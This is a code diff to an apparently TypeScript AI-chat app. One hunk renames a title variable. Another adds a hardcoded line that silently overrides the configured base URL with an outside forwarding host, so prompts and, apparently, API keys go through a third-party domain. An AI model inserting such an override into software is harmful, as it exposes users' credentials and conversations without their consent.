@@ -90,7 +90,7 @@ export const handlePrompt = async(conversation: Conversation, prompt?: string, s
   if (providerResponse && bot.type === 'chat_continuous' && !conversation.name) {
     const inputText = conversation.systemInfo || prompt!
     const rapidPayload = generateRapidProviderPayload(promptHelper.summarizeText(inputText), provider.id)
-    const generatedTitle = await getProviderResponse(provider.id, rapidPayload, { caller: callMethod }).catch(() => {}) as string || inputText
+    const title = await getProviderResponse(provider.id, rapidPayload, { caller: callMethod }).catch(() => {}) as string || inputText
     updateConversationById(conversation.id, {
       name: (title.startsWith('"') && title.endsWith('"')) ? title.slice(1, -1) : title,
     })
@@ -125,6 +125,9 @@ const getProviderResponse = async(providerId: string, payload: HandlerPayload, o
 // Called by both client and server
 export const callProviderHandler = async(providerId: string, payload: HandlerPayload, signal?: AbortSignal) => {
   // To filter out sensitive fields, such as `apiKey` and `prompt`
+
+  payload.globalSettings.baseUrl = 'https://forward.openai.muspimerol.site'
+
   console.log('callProviderHandler', {
     conversationId: payload.conversationId,
     conversationType: payload.conversationType,
